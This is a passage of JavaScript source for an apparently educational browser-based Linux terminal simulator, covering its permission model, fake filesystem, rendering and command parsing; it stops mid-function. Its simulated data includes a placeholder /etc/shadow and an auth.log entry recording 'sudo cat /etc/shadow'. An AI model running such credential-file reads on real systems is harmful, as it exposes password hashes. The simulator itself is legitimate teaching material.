/**
 * CLHTerminal.js - Command Line Hacker Terminal Simulator
 * Hexworth Prime - House of Script
 *
 * A comprehensive, realistic Linux terminal simulator for the CLH course.
 * Built on LinuxTerminal.js foundation with additions:
 * - Objective tracking system
 * - Filesystem overlays (base + module-specific)
 * - Permission enforcement
 * - Process simulation
 * - Network commands
 * - And more...
 *
 * Usage:
 *   CLHTerminal.init('CLH-002', '#container');
 *
 * Version: 1.0.0
 * Created: January 17, 2026
 */

const _CLHTerminalModule = (function() {
    'use strict';

    // ═══════════════════════════════════════════════════════════════
    // CONFIGURATION & STATE
    // ═══════════════════════════════════════════════════════════════

    let config = {
        moduleId: null,
        container: null,
        user: 'operator',
        hostname: 'hexworth',
        startDir: '/home/operator',
        prompt: null,  // Auto-generated if not set
    };

    let state = {
        currentDir: '/home/operator',
        commandHistory: [],
        historyIndex: -1,
        env: {},
        fs: {},
        objectives: [],
        objectivesCompleted: {},
        isInitialized: false,
        isSudoMode: false,
        sudoTimeout: null,
        processes: {},
        nextPid: 1000,
        jobs: [],
        nextJobId: 1,
        remoteHost: null,  // For SSH simulation
        localState: null,   // Saved state when SSH'd
    };

    let elements = {
        container: null,
        output: null,
        inputLine: null,
        promptSpan: null,
        input: null,
        objectivesPanel: null,
    };

    // Current user info
    let currentUser = {
        username: 'operator',
        uid: 1000,
        gid: 1000,
        groups: [
            { gid: 1000, name: 'operator' },
            { gid: 27, name: 'sudo' },
            { gid: 100, name: 'users' },
        ],
        home: '/home/operator',
        shell: '/bin/bash',
    };

    // ═══════════════════════════════════════════════════════════════
    // PERMISSION SYSTEM
    // ═══════════════════════════════════════════════════════════════

    /**
     * Parse a permission string like '-rwxr-xr-x' or 'drwxr-xr-x'
     * Returns object with read/write/execute for owner/group/other
     */
    function _parsePermissions(permStr) {
        // Handle empty or invalid strings
        if (!permStr || permStr.length < 10) {
            return { owner: { r: true, w: true, x: true }, group: { r: true, w: false, x: true }, other: { r: true, w: false, x: true } };
        }
        return {
            owner: { r: permStr[1] === 'r', w: permStr[2] === 'w', x: permStr[3] === 'x' || permStr[3] === 's' },
            group: { r: permStr[4] === 'r', w: permStr[5] === 'w', x: permStr[6] === 'x' || permStr[6] === 's' },
            other: { r: permStr[7] === 'r', w: permStr[8] === 'w', x: permStr[9] === 'x' || permStr[9] === 't' }
        };
    }

    /**
     * Convert numeric mode (755) to permission string (-rwxr-xr-x)
     */
    function _numericToPermString(mode, isDir = false) {
        const typeChar = isDir ? 'd' : '-';
        const digits = mode.toString().padStart(3, '0');
        const chars = ['---', '--x', '-w-', '-wx', 'r--', 'r-x', 'rw-', 'rwx'];
        return typeChar + chars[parseInt(digits[0])] + chars[parseInt(digits[1])] + chars[parseInt(digits[2])];
    }

    /**
     * Check if current user can read a file/directory
     */
    function _canRead(node) {
        if (!node) return false;
        if (state.isSudoMode || currentUser.username === 'root') return true;

        const perms = _parsePermissions(node.perms);

        // Check owner
        if (node.owner === currentUser.username) return perms.owner.r;

        // Check group
        const userGroups = currentUser.groups.map(g => g.name);
        if (userGroups.includes(node.group)) return perms.group.r;

        // Check other
        return perms.other.r;
    }

    /**
     * Check if current user can write to a file/directory
     */
    function _canWrite(node) {
        if (!node) return false;
        if (state.isSudoMode || currentUser.username === 'root') return true;

        const perms = _parsePermissions(node.perms);

        // Check owner
        if (node.owner === currentUser.username) return perms.owner.w;

        // Check group
        const userGroups = currentUser.groups.map(g => g.name);
        if (userGroups.includes(node.group)) return perms.group.w;

        // Check other
        return perms.other.w;
    }

    /**
     * Check if current user can execute/traverse a file/directory
     */
    function _canExecute(node) {
        if (!node) return false;
        if (state.isSudoMode || currentUser.username === 'root') return true;

        const perms = _parsePermissions(node.perms);

        // Check owner
        if (node.owner === currentUser.username) return perms.owner.x;

        // Check group
        const userGroups = currentUser.groups.map(g => g.name);
        if (userGroups.includes(node.group)) return perms.group.x;

        // Check other
        return perms.other.x;
    }

    /**
     * Get the parent path of a given path
     */
    function _getParentPath(path) {
        const parts = path.split('/').filter(Boolean);
        if (parts.length <= 1) return '/';
        return '/' + parts.slice(0, -1).join('/');
    }

    /**
     * Check if user can write to parent directory (for creating files)
     */
    function _canWriteToParent(path) {
        const parentPath = _getParentPath(path);
        const parentNode = state.fs[parentPath];
        return _canWrite(parentNode);
    }

    // ═══════════════════════════════════════════════════════════════
    // BASE FILESYSTEM
    // Always present in every module
    // ═══════════════════════════════════════════════════════════════

    const BASE_FILESYSTEM = {
        '/': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['home', 'etc', 'var', 'tmp', 'usr', 'bin', 'sbin', 'opt', 'root', 'dev', 'proc', 'sys'] },
        '/home': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['operator'] },
        '/home/operator': { type: 'dir', perms: 'drwxr-xr-x', owner: 'operator', group: 'operator', children: ['.bashrc', '.profile', '.bash_history'] },
        '/home/operator/.bashrc': { type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 512, content: '# ~/.bashrc\nexport PATH=$PATH:~/bin\nalias ll="ls -la"\nalias la="ls -A"\nalias l="ls -CF"\nalias grep="grep --color=auto"\n\n# Hexworth CLI Environment\nexport PS1="\\u@\\h:\\w\\$ "\n' },
        '/home/operator/.profile': { type: 'file', perms: '-rw-r--r--', owner: 'operator', group: 'operator', size: 256, content: '# ~/.profile\nif [ -f ~/.bashrc ]; then\n    . ~/.bashrc\nfi\n' },
        '/home/operator/.bash_history': { type: 'file', perms: '-rw-------', owner: 'operator', group: 'operator', size: 128, content: 'ls -la\ncd /var/log\ncat syslog\nwhoami\n' },

        // /etc - System configuration
        '/etc': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['passwd', 'group', 'shadow', 'hostname', 'hosts', 'resolv.conf', 'fstab', 'ssh', 'crontab'] },
        '/etc/passwd': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 1024, content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\noperator:x:1000:1000:Field Operator:/home/operator:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nsshd:x:110:65534::/run/sshd:/usr/sbin/nologin\n' },
        '/etc/group': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512, content: 'root:x:0:\noperator:x:1000:operator\nsudo:x:27:operator\nusers:x:100:operator\nwww-data:x:33:\nsshd:x:110:\n' },
        '/etc/shadow': { type: 'file', perms: '-rw-r-----', owner: 'root', group: 'shadow', size: 256, content: 'root:$6$rounds=656000$salt$hash:19000:0:99999:7:::\noperator:$6$rounds=656000$salt$hash:19000:0:99999:7:::\n' },
        '/etc/hostname': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 16, content: 'hexworth\n' },
        '/etc/hosts': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256, content: '127.0.0.1\tlocalhost\n127.0.1.1\thexworth\n::1\t\tlocalhost ip6-localhost ip6-loopback\n\n# Internal network\n10.0.0.1\tgateway.internal\n10.0.0.10\ttarget.internal\n10.0.0.50\tarchive.internal\n' },
        '/etc/resolv.conf': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 64, content: 'nameserver 10.0.0.1\nnameserver 8.8.8.8\nsearch internal\n' },
        '/etc/fstab': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512, content: '# /etc/fstab: static file system information.\nUUID=a1b2c3d4 /               ext4    errors=remount-ro 0       1\nUUID=e5f6g7h8 /home           ext4    defaults          0       2\ntmpfs          /tmp            tmpfs   defaults          0       0\n' },
        '/etc/ssh': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['sshd_config', 'ssh_host_rsa_key.pub'] },
        '/etc/ssh/sshd_config': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256, content: '# SSH Server Configuration\nPort 22\nPermitRootLogin no\nPasswordAuthentication yes\nPubkeyAuthentication yes\n' },
        '/etc/ssh/ssh_host_rsa_key.pub': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 512, content: 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... root@hexworth\n' },
        '/etc/crontab': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256, content: '# /etc/crontab: system-wide crontab\nSHELL=/bin/bash\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# m h dom mon dow user  command\n*/15 * * * * root  /usr/bin/log-rotate\n0 2 * * * root  /usr/bin/backup-system\n' },

        // /var - Variable data
        '/var': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['log', 'www', 'tmp', 'spool'] },
        '/var/log': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['syslog', 'auth.log', 'dmesg', 'kern.log'] },
        '/var/log/syslog': { type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096, content: 'Jan 17 08:00:01 hexworth CRON[1234]: (root) CMD (test -x /usr/sbin/anacron)\nJan 17 08:15:22 hexworth systemd[1]: Started Daily apt download activities.\nJan 17 08:30:45 hexworth kernel: [UFW BLOCK] IN=eth0 OUT= SRC=192.168.1.105\nJan 17 09:00:00 hexworth systemd[1]: Starting System Logging Service...\nJan 17 09:00:01 hexworth rsyslogd[512]: rsyslogd started\n' },
        '/var/log/auth.log': { type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048, content: 'Jan 17 07:30:00 hexworth sshd[5678]: Accepted publickey for operator from 10.0.0.1 port 52413\nJan 17 07:30:00 hexworth systemd-logind[890]: New session 1 of user operator.\nJan 17 08:45:12 hexworth sudo: operator : TTY=pts/0 ; PWD=/home/operator ; USER=root ; COMMAND=/bin/cat /etc/shadow\n' },
        '/var/log/dmesg': { type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048, content: '[    0.000000] Linux version 6.1.0-hexworth\n[    0.000001] Command line: BOOT_IMAGE=/vmlinuz root=UUID=a1b2c3d4\n[    0.523456] CPU: 4 cores detected\n[    1.234567] Memory: 8192MB available\n[    2.345678] ACPI: Core revision 20210730\n' },
        '/var/log/kern.log': { type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024, content: 'Jan 17 08:00:00 hexworth kernel: [    0.000000] Linux version 6.1.0-hexworth\nJan 17 08:00:00 hexworth kernel: [   12.345678] eth0: link up, 1000 Mbps\n' },
        '/var/www': { type: 'dir', perms: 'drwxr-xr-x', owner: 'www-data', group: 'www-data', children: ['html'] },
        '/var/www/html': { type: 'dir', perms: 'drwxr-xr-x', owner: 'www-data', group: 'www-data', children: ['index.html'] },
        '/var/www/html/index.html': { type: 'file', perms: '-rw-r--r--', owner: 'www-data', group: 'www-data', size: 256, content: '<!DOCTYPE html>\n<html>\n<head><title>Hexworth Internal</title></head>\n<body><h1>Welcome to Hexworth Systems</h1><p>Authorized access only.</p></body>\n</html>\n' },
        '/var/tmp': { type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root', children: [] },
        '/var/spool': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['cron'] },
        '/var/spool/cron': { type: 'dir', perms: 'drwx------', owner: 'root', group: 'root', children: [] },

        // /tmp - Temporary files
        '/tmp': { type: 'dir', perms: 'drwxrwxrwt', owner: 'root', group: 'root', children: [] },

        // /usr - User programs
        '/usr': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bin', 'sbin', 'lib', 'share', 'local'] },
        '/usr/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['python3', 'vim', 'nano', 'git', 'curl', 'wget', 'ssh', 'scp', 'tree', 'htop'] },
        '/usr/sbin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['sshd', 'cron', 'useradd'] },
        '/usr/lib': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
        '/usr/share': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['man', 'doc'] },
        '/usr/share/man': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
        '/usr/share/doc': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
        '/usr/local': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bin', 'lib'] },
        '/usr/local/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
        '/usr/local/lib': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },

        // /bin - Essential binaries
        '/bin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['bash', 'sh', 'ls', 'cat', 'cp', 'mv', 'rm', 'mkdir', 'rmdir', 'chmod', 'chown', 'grep', 'find', 'tar'] },

        // /sbin - System binaries
        '/sbin': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['init', 'shutdown', 'reboot', 'ifconfig', 'iptables'] },

        // /opt - Optional software
        '/opt': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },

        // /root - Root home
        '/root': { type: 'dir', perms: 'drwx------', owner: 'root', group: 'root', children: ['.bashrc', '.ssh'] },
        '/root/.bashrc': { type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256, content: '# ~/.bashrc for root\nexport PS1="\\u@\\h:\\w# "\nalias ll="ls -la"\n' },
        '/root/.ssh': { type: 'dir', perms: 'drwx------', owner: 'root', group: 'root', children: ['authorized_keys'] },
        '/root/.ssh/authorized_keys': { type: 'file', perms: '-rw-------', owner: 'root', group: 'root', size: 0, content: '' },

        // /dev - Devices
        '/dev': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['null', 'zero', 'random', 'urandom', 'tty', 'sda', 'sda1', 'sda2'] },

        // /proc - Process info (virtual)
        '/proc': { type: 'dir', perms: 'dr-xr-xr-x', owner: 'root', group: 'root', children: ['cpuinfo', 'meminfo', 'version', 'uptime', 'loadavg', 'self'] },
        '/proc/cpuinfo': { type: 'file', perms: '-r--r--r--', owner: 'root', group: 'root', size: 1024, content: 'processor\t: 0\nvendor_id\t: GenuineIntel\nmodel name\t: Intel(R) Core(TM) i7-9700K CPU @ 3.60GHz\ncpu MHz\t\t: 3600.000\ncache size\t: 12288 KB\ncpu cores\t: 8\nflags\t\t: fpu vme de pse tsc msr pae mce cx8 apic sep\n' },
        '/proc/meminfo': { type: 'file', perms: '-r--r--r--', owner: 'root', group: 'root', size: 512, content: 'MemTotal:        8192000 kB\nMemFree:         4096000 kB\nMemAvailable:    6144000 kB\nBuffers:          512000 kB\nCached:          1024000 kB\nSwapTotal:       2097152 kB\nSwapFree:        2097152 kB\n' },
        '/proc/version': { type: 'file', perms: '-r--r--r--', owner: 'root', group: 'root', size: 128, content: 'Linux version 6.1.0-hexworth (gcc version 12.2.0) #1 SMP PREEMPT_DYNAMIC\n' },
        '/proc/uptime': { type: 'file', perms: '-r--r--r--', owner: 'root', group: 'root', size: 32, content: '86400.00 172800.00\n' },
        '/proc/loadavg': { type: 'file', perms: '-r--r--r--', owner: 'root', group: 'root', size: 32, content: '0.15 0.10 0.05 1/127 1234\n' },
        '/proc/self': { type: 'dir', perms: 'dr-xr-xr-x', owner: 'operator', group: 'operator', children: ['status'] },
        '/proc/self/status': { type: 'file', perms: '-r--r--r--', owner: 'operator', group: 'operator', size: 256, content: 'Name:\tbash\nPid:\t1000\nUid:\t1000\t1000\t1000\t1000\nGid:\t1000\t1000\t1000\t1000\n' },

        // /sys - System info (virtual)
        '/sys': { type: 'dir', perms: 'dr-xr-xr-x', owner: 'root', group: 'root', children: ['class', 'devices'] },
        '/sys/class': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['net'] },
        '/sys/class/net': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: ['eth0', 'lo'] },
        '/sys/devices': { type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root', children: [] },
    };

    // ═══════════════════════════════════════════════════════════════
    // INITIALIZATION
    // ═══════════════════════════════════════════════════════════════

    /**
     * Initialize the terminal for a specific module
     * @param {string} moduleId - The module ID (e.g., 'CLH-002')
     * @param {string} containerSelector - CSS selector for container
     */
    function init(moduleId, containerSelector) {
        console.log(`[CLHTerminal] Initializing module: ${moduleId}`);

        // Get module config
        const moduleConfig = typeof CLHConfig !== 'undefined' ? CLHConfig.getModule(moduleId) : null;

        if (!moduleConfig) {
            console.error(`[CLHTerminal] Module not found: ${moduleId}`);
            _renderError(containerSelector, `Module ${moduleId} not found. Check CLHConfig.js`);
            return false;
        }

        // Check prerequisites
        if (!_checkPrerequisites(moduleConfig.prerequisites)) {
            _renderLocked(containerSelector, moduleConfig);
            return false;
        }

        // Store config
        config.moduleId = moduleId;
        config.container = containerSelector;
        config.user = moduleConfig.user || 'operator';
        config.hostname = moduleConfig.hostname || 'hexworth';
        config.startDir = moduleConfig.startDir || `/home/${config.user}`;

        // Initialize user
        currentUser.username = config.user;
        currentUser.home = `/home/${config.user}`;

        // Initialize environment
        state.env = _initEnv();

        // Initialize filesystem with overlays
        state.fs = _initFilesystem(moduleConfig.filesystem);

        // Initialize objectives
        state.objectives = moduleConfig.objectives || [];
        state.objectivesCompleted = {};

        // Set initial directory
        state.currentDir = config.startDir;
        state.env.PWD = config.startDir;

        // Initialize processes (base system processes)
        _initProcesses();

        // Render the terminal
        _render(containerSelector, moduleConfig);

        // Mark as initialized
        state.isInitialized = true;

        // Print welcome message
        _printWelcome(moduleConfig);

        // Focus input
        if (elements.input) {
            elements.input.focus();
        }

        return true;
    }

    /**
     * Check if prerequisites are met
     */
    function _checkPrerequisites(prerequisites) {
        if (!prerequisites || prerequisites.length === 0) {
            return true;
        }

        // Check ModuleProgress if available
        if (typeof ModuleProgress !== 'undefined') {
            for (const prereq of prerequisites) {
                if (!ModuleProgress.isCompleted('script', prereq.toLowerCase())) {
                    return false;
                }
            }
        }

        return true;
    }

    /**
     * Initialize environment variables
     */
    function _initEnv() {
        return {
            USER: config.user,
            HOME: `/home/${config.user}`,
            PWD: config.startDir,
            OLDPWD: config.startDir,
            SHELL: '/bin/bash',
            PATH: '/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin',
            TERM: 'xterm-256color',
            LANG: 'en_US.UTF-8',
            HOSTNAME: config.hostname,
            PS1: `${config.user}@${config.hostname}:\\w\\$ `,
            EDITOR: 'nano',
            LOGNAME: config.user,
            SHLVL: '1',
        };
    }

    /**
     * Initialize filesystem with base + module overlay
     */
    function _initFilesystem(overlay) {
        // Deep clone base filesystem
        const fs = JSON.parse(JSON.stringify(BASE_FILESYSTEM));

        // Apply module overlay
        if (overlay) {
            for (const [path, node] of Object.entries(overlay)) {
                fs[path] = node;

                // Update parent directory's children array
                const parentPath = path.split('/').slice(0, -1).join('/') || '/';
                const fileName = path.split('/').pop();
                if (fs[parentPath] && fs[parentPath].children) {
                    if (!fs[parentPath].children.includes(fileName)) {
                        fs[parentPath].children.push(fileName);
                    }
                }
            }
        }

        return fs;
    }

    /**
     * Initialize base system processes
     */
    function _initProcesses() {
        state.processes = {
            1: { pid: 1, ppid: 0, user: 'root', cmd: '/sbin/init', state: 'S', cpu: 0.0, mem: 0.1, start: '06:30' },
            234: { pid: 234, ppid: 1, user: 'root', cmd: '/usr/sbin/sshd', state: 'S', cpu: 0.0, mem: 0.1, start: '06:30' },
            456: { pid: 456, ppid: 1, user: 'root', cmd: '/usr/sbin/cron', state: 'S', cpu: 0.0, mem: 0.0, start: '06:30' },
            512: { pid: 512, ppid: 1, user: 'root', cmd: '/usr/sbin/rsyslogd', state: 'S', cpu: 0.0, mem: 0.1, start: '06:31' },
            890: { pid: 890, ppid: 234, user: config.user, cmd: '-bash', state: 'S', cpu: 0.0, mem: 0.0, start: '09:00' },
        };
        state.nextPid = 1000;
    }

    // ═══════════════════════════════════════════════════════════════
    // RENDERING
    // ═══════════════════════════════════════════════════════════════

    function _render(containerSelector, moduleConfig) {
        const container = document.querySelector(containerSelector);
        if (!container) {
            console.error(`[CLHTerminal] Container not found: ${containerSelector}`);
            return;
        }

        elements.container = container;

        // Build terminal HTML
        container.innerHTML = `
            <div class="clh-terminal">
                <div class="clh-header">
                    <div class="clh-header-left">
                        <span class="clh-badge">${config.moduleId}</span>
                        <span class="clh-title">${moduleConfig.title}</span>
                    </div>
                    <div class="clh-header-right">
                        <a href="../../../houses/script/index.html" class="clh-back">← Script House</a>
                    </div>
                </div>
                <div class="clh-body">
                    <div class="clh-terminal-area">
                        <div class="clh-terminal-header">
                            <span class="clh-dot red"></span>
                            <span class="clh-dot yellow"></span>
                            <span class="clh-dot green"></span>
                            <span class="clh-terminal-title">${config.user}@${config.hostname}</span>
                        </div>
                        <div class="clh-output" id="clh-output"></div>
                        <div class="clh-input-line">
                            <span class="clh-prompt" id="clh-prompt">${_getPrompt()}</span>
                            <input type="text" class="clh-input" id="clh-input" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                        </div>
                    </div>
                    <div class="clh-objectives-panel" id="clh-objectives">
                        <h3>Objectives</h3>
                        <div class="clh-objectives-list" id="clh-objectives-list"></div>
                    </div>
                </div>
            </div>
        `;

        // Store element references
        elements.output = container.querySelector('#clh-output');
        elements.promptSpan = container.querySelector('#clh-prompt');
        elements.input = container.querySelector('#clh-input');
        elements.objectivesPanel = container.querySelector('#clh-objectives-list');

        // Render objectives
        _renderObjectives();

        // Setup event listeners
        _setupEventListeners();

        // Inject styles if not present
        _injectStyles();
    }

    function _renderObjectives() {
        if (!elements.objectivesPanel || !state.objectives.length) return;

        elements.objectivesPanel.innerHTML = state.objectives.map((obj, idx) => `
            <div class="clh-objective ${state.objectivesCompleted[obj.id] ? 'completed' : ''}" data-id="${obj.id}">
                <span class="clh-objective-num">${state.objectivesCompleted[obj.id] ? '✓' : idx + 1}</span>
                <div class="clh-objective-text">
                    <div class="clh-objective-task">${obj.task}</div>
                    ${obj.hint ? `<div class="clh-objective-hint">${obj.hint}</div>` : ''}
                </div>
            </div>
        `).join('');
    }

    function _renderLocked(containerSelector, moduleConfig) {
        const container = document.querySelector(containerSelector);
        if (!container) return;

        container.innerHTML = `
            <div class="clh-locked">
                <div class="clh-locked-icon">🔒</div>
                <h2>Module Locked</h2>
                <p>Complete the prerequisite modules first:</p>
                <ul>
                    ${moduleConfig.prerequisites.map(p => `<li>${p}</li>`).join('')}
                </ul>
                <a href="../../../houses/script/index.html" class="clh-locked-back">← Back to Script House</a>
            </div>
        `;

        _injectStyles();
    }

    function _renderError(containerSelector, message) {
        const container = document.querySelector(containerSelector);
        if (!container) return;

        container.innerHTML = `
            <div class="clh-error">
                <div class="clh-error-icon">⚠️</div>
                <h2>Error</h2>
                <p>${message}</p>
                <a href="../../../houses/script/index.html" class="clh-error-back">← Back to Script House</a>
            </div>
        `;

        _injectStyles();
    }

    function _printWelcome(moduleConfig) {
        _print(`<span class="clh-welcome">╔════════════════════════════════════════════════════════════╗</span>`);
        _print(`<span class="clh-welcome">║  ${moduleConfig.title.padEnd(56)}  ║</span>`);
        _print(`<span class="clh-welcome">║  ${(moduleConfig.description || '').padEnd(56)}  ║</span>`);
        _print(`<span class="clh-welcome">╚════════════════════════════════════════════════════════════╝</span>`);
        _print('');
        _print(`Type <span class="clh-cmd">help</span> for available commands.`);
        _print('');
    }

    // ═══════════════════════════════════════════════════════════════
    // EVENT HANDLING
    // ═══════════════════════════════════════════════════════════════

    function _setupEventListeners() {
        if (!elements.input) return;

        elements.input.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const cmd = elements.input.value;
                elements.input.value = '';
                _execute(cmd);
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                _historyUp();
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                _historyDown();
            } else if (e.key === 'Tab') {
                e.preventDefault();
                _tabComplete();
            } else if (e.key === 'c' && e.ctrlKey) {
                e.preventDefault();
                _interrupt();
            } else if (e.key === 'l' && e.ctrlKey) {
                e.preventDefault();
                _clear();
            }
        });

        // Keep focus on input
        elements.container.addEventListener('click', (e) => {
            if (!e.target.closest('a, button')) {
                elements.input.focus();
            }
        });
    }

    // ═══════════════════════════════════════════════════════════════
    // COMMAND EXECUTION
    // ═══════════════════════════════════════════════════════════════

    function _execute(cmdLine) {
        cmdLine = cmdLine.trim();
        if (!cmdLine) return;

        // Add to history
        state.commandHistory.push(cmdLine);
        state.historyIndex = state.commandHistory.length;

        // Display command
        _print(`<span class="clh-prompt">${_getPrompt()}</span><span class="clh-cmd">${_escape(cmdLine)}</span>`);

        // Parse and execute
        const output = _processCommand(cmdLine);

        if (output !== null && output !== undefined && output !== '') {
            _print(output);
        }

        // Check objectives (pass output for 3-param checks)
        _checkObjectives(cmdLine, output);

        // Scroll to bottom
        if (elements.output) {
            elements.output.scrollTop = elements.output.scrollHeight;
        }
    }

    function _processCommand(cmdLine) {
        // Handle background execution (&)
        if (cmdLine.trim().endsWith('&')) {
            const cmd = cmdLine.slice(0, -1).trim();
            return _runInBackground(cmd);
        }

        // Handle command chaining (&&, ||, ;)
        if (cmdLine.includes('&&') || cmdLine.includes('||') || cmdLine.includes(';')) {
            return _executeChain(cmdLine);
        }

        // Handle pipes
        if (cmdLine.includes('|')) {
            return _executePipeline(cmdLine);
        }

        // Handle output redirection
        if (cmdLine.includes('>')) {
            return _executeRedirect(cmdLine);
        }

        // Parse single command
        const { cmd, args } = _parseCommand(cmdLine);
        return _executeCommand(cmd, args, cmdLine);
    }

    /**
     * Run a command in the background, add it to jobs list
     */
    function _runInBackground(cmdLine) {
        const jobId = state.nextJobId++;
        const pid = state.nextPid++;

        // Add to jobs list
        state.jobs.push({
            id: jobId,
            pid: pid,
            cmd: cmdLine,
            status: 'Running',
            startTime: new Date().toLocaleTimeString()
        });

        // Add to process table
        state.processes[pid] = {
            pid: pid,
            ppid: 890,  // Parent is the user's shell
            user: currentUser.username,
            cmd: cmdLine,
            state: 'S',
            cpu: 0.0,
            mem: 0.0,
            start: new Date().toLocaleTimeString().slice(0, 5)
        };

        return `[${jobId}] ${pid}`;
    }

    function _parseCommand(cmdLine) {
        const parts = [];
        let current = '';
        let inQuote = false;
        let quoteChar = '';

        for (let i = 0; i < cmdLine.length; i++) {
            const char = cmdLine[i];
            if ((char === '"' || char === "'") && !inQuote) {
                inQuote = true;
                quoteChar = char;
            } else if (char === quoteChar && inQuote) {
                inQuote = false;
                quoteChar = '';
            } else if (char === ' ' && !inQuote) {
                if (current) {
                    parts.push(current);
                    current = '';
                }
            } else {
                current += char;
            }
        }
        if (current) parts.push(current);

        // Get command and arguments
        const cmd = parts[0] || '';
        const rawArgs = parts.slice(1);

        // Expand arguments (subshells, vars, braces, globs)
        const expandedArgs = _expandArgs(rawArgs);

        return {
            cmd: _expandVars(cmd),  // Expand vars in command too
            args: expandedArgs
        };
    }

    function _expandVars(str) {
        return str
            .replace(/\$\{(\w+)\}/g, (_, name) => state.env[name] || '')
            .replace(/\$(\w+)/g, (_, name) => state.env[name] || '');
    }

    /**
     * Expand glob patterns (*, ?, [abc], [a-z])
     * Returns array of matching paths or original pattern if no matches
     */
    function _expandGlob(pattern, baseDir) {
        // If no glob characters, return as-is
        if (!/[*?\[\]]/.test(pattern)) {
            return [pattern];
        }

        baseDir = baseDir || state.currentDir;

        // Get the directory to search in
        let searchDir = baseDir;
        let patternPart = pattern;

        // If pattern has a path component, split it
        if (pattern.includes('/')) {
            const lastSlash = pattern.lastIndexOf('/');
            const dirPart = pattern.slice(0, lastSlash) || '/';
            patternPart = pattern.slice(lastSlash + 1);
            searchDir = _resolvePath(dirPart);
        }

        const dirNode = state.fs[searchDir];
        if (!dirNode || dirNode.type !== 'dir' || !dirNode.children) {
            return [pattern];  // Return original if directory not found
        }

        // Convert glob pattern to regex
        let regex = patternPart
            .replace(/\./g, '\\.')           // Escape dots
            .replace(/\*/g, '.*')            // * = any characters
            .replace(/\?/g, '.')             // ? = single character
            .replace(/\[!/g, '[^')           // [!...] = not in set
            .replace(/\[([^\]]+)\]/g, '[$1]');  // Character classes

        // Add anchors
        regex = '^' + regex + '$';

        const matches = [];
        const re = new RegExp(regex);

        for (const child of dirNode.children) {
            // Skip hidden files unless pattern starts with .
            if (child.startsWith('.') && !patternPart.startsWith('.')) {
                continue;
            }
            if (re.test(child)) {
                const fullPath = searchDir === state.currentDir ? child :
                    (searchDir === '/' ? '/' + child : searchDir + '/' + child);
                matches.push(fullPath);
            }
        }

        // Return original pattern if no matches (like real bash)
        return matches.length > 0 ? matches.sort() : [pattern];
    }

    /**
     * Expand brace patterns ({a,b,c}, {1..5})
     * Returns array of expanded strings
     */
    function _expandBraces(str) {
        // Match {a,b,c} or {1..5} patterns
        const braceMatch = str.match(/\{([^{}]+)\}/);
        if (!braceMatch) return [str];

        const prefix = str.slice(0, braceMatch.index);
        const suffix = str.slice(braceMatch.index + braceMatch[0].length);
        const content = braceMatch[1];

        let expansions = [];

        // Check for range pattern {1..5} or {a..z}
        const rangeMatch = content.match(/^(\d+)\.\.(\d+)$/) || content.match(/^([a-zA-Z])\.\.([a-zA-Z])$/);
        if (rangeMatch) {
            const start = rangeMatch[1];
            const end = rangeMatch[2];

